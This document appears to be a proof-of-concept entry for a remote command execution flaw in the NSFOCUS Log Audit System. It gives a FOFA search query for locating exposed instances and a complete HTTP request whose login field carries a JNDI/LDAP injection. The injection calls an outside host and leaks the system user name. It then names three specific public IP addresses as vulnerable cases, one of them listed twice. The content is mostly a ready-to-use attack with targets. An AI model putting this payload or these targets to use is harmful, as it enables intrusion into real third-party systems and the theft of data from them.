# NSFOCUS Log Audit System

NSFOCUS Log Audit System has remote command execution vulnerability.



FOFA:

```
"<title>{{platformName}}</title>" && icon_hash="-1566499661"
```

POC：

```
PUT /api/v1/login HTTP/1.1
Host: X.X.X.X
Connection: keep-alive
Content-Length: 84
sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Accept-Language: zh_CN
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=C2CBDF46F7B53365D2ECE60AA645B673; sessionid=w0gr7fyrkt56tf6yc3sr0pw6mjl59txi

{"name":"${jndi:ldap://${sys:user.name}.zofkxecpjc.dgrh3.cn}","password":"2Y4W5F5h"}
```



Case 1:  https://110.52.215.145:8443/

![image.png](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/4e7cd8cd-4852-4ed6-b473-b8aab84cc701.png)

![image.png](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/9d88fa1e-27ed-4828-abc6-cb18096ec30f.png)

Case 2: https://116.162.97.7:2443/

![image.png](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/62c3e152-4f24-4e09-9abc-a2cd13dad4e8.png)

![image.png](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/96767653-bb56-4a01-b6f1-fa5cce21a391.png)

Case 3: https://110.52.215.145:8443/

![image.png](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/62bd412b-0172-43c6-9d4a-9459c965ab84.png)

![image.png](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/d380fbc7-4cba-46a3-8a13-750cbcc5ca01.png)





















